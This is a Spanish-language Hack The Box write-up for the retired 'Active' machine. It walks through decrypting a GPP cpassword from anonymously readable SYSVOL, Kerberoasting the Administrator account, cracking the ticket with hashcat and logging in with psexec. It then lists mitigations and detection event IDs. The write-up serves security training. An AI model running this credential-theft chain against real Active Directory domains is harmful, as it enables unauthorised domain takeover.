---
machine: Active
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory
state: Retired
tags: [windows, active-directory, gpp, cpassword, kerberoasting, smb]
---

# Active — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Clásico de configuración, no de exploit: el share `Replication` (SYSVOL) es legible de forma anónima y contiene un `Groups.xml` con un `cpassword` de **GPP**. La clave AES es pública desde MS14-025, así que se descifra y da credenciales de `SVC_TGS`. Con esa cuenta se enumeran usuarios por RID y se hace **Kerberoasting** contra Administrator, que tiene un SPN que no debería tener. El TGS se crackea y se entra como administrador del dominio.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
53, 88, 135, 139, 389, 445, 464, 593, 636, 3268, 3269, 49152-...
```

El conjunto es un controlador de dominio de `active.htb` (DNS, Kerberos, LDAP, SMB).

```bash
smbclient -L //<IP>/ -N
smbclient //<IP>/Replication -N
```

```text
Replication   Disk
```

## Enumeración

- `smbclient -L //<IP>/ -N` acepta sesión nula y lista `Replication` (el SYSVOL replicado). Sin credenciales se recorre `active.htb\Policies\{...}\MACHINE\Preferences\Groups\Groups.xml`.
- El `cpassword` se descifra con `gpp-decrypt` porque la clave AES de GPP es pública desde MS14-025: sale `SVC_TGS`.
- Con `SVC_TGS` se enumeran usuarios por RID (`nxc smb <IP> -u SVC_TGS -p <pass> --rid-brute`) y se piden TGS con `impacket-GetUserSPNs 'active.htb/SVC_TGS:<pass>' -dc-ip <IP> -request`: el SPN de **Administrator** aparece porque nadie lo justificó.

## Foothold

1. **GPP en SYSVOL**:

```bash
smbclient //<IP>/Replication -N -c 'recurse ON; prompt OFF; mget *'
grep -ril cpassword .
cat ./active.htb/Policies/{...}/MACHINE/Preferences/Groups/Groups.xml
```

```xml
<Properties userName="SVC_TGS" cpassword="<cpassword>" .../>
```

2. **Descifrado** (MS14-025: la clave está publicada):

```bash
gpp-decrypt '<cpassword>'
# contraseña de SVC_TGS
```

3. **Enumeración y Kerberoasting**:

```bash
nxc smb <IP> -u SVC_TGS -p '<password>' --rid-brute
impacket-GetUserSPNs active.htb/SVC_TGS:'<password>' -dc-ip <IP> -request
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt
```

Administrator tiene un SPN registrado por error, así que su TGS se pide y se crackea offline.

```bash
impacket-psexec active.htb/Administrator:'<password>'@<IP>
# o evil-winrm si 5985 está abierto
```

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

No hay escalada como tal: la cuenta crackeada ya es del dominio. Se confirma y se cierra con la flag de root en el escritorio de Administrator.

```cmd
whoami
# active\administrator
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- `Replication` puede requerir navegar la ruta completa de la GPO; `recurse ON` antes de `mget`.
- `GetUserSPNs` pide el TGS con `-request`; sin ese flag solo lista.
- El hash es `-m 13100` (TGS-REP etype 23), no `-m 1000`.
- Si `psexec` falla por SMB firmado, usar `wmiexec` o `smbexec`.

- GPP con `cpassword` es una credencial en claro: Microsoft publicó la clave y aun así sigue apareciendo en SYSVOL.
- Un SPN en una cuenta privilegiada convierte cualquier usuario del dominio en capaz de pedir su TGS.
- Mitigación: borrar `cpassword` del SYSVOL, contraseñas largas en cuentas de servicio y revisar SPNs innecesarios.

## Mitigaciones y detección

- Activar la preautenticación Kerberos, usar contraseñas largas en cuentas de servicio y forzar AES.
- Detección: 4768 con `PreAuthType=0` y 4769 con RC4 fuera de la línea base.
- Firmar SMB, deshabilitar SMBv1 y limitar los shares administrativos por grupo.
- Detección: 5140/5145 anómalos y 4624 tipo 3 con NTLM desde hosts no administrativos.

## Referencias

- [kerberos-enum](../../../knowledge/windows/kerberos-enum.md)
